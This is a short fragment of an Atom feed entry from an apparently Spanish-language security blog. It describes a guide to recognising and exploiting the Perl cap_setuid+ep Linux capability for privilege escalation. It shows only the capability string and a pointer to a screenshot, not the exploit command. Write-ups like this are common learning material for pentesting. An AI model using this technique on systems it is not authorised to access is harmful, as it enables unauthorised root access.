+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl cap_setuid+ep&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces lo que hacemos es:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/perl/perl2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>notlucken</name></author><category term="Perl" /><summary type="html">Guia para reconocer y explotar Perl cap_setuid+ep y escalar privilegios</summary></entry></feed>
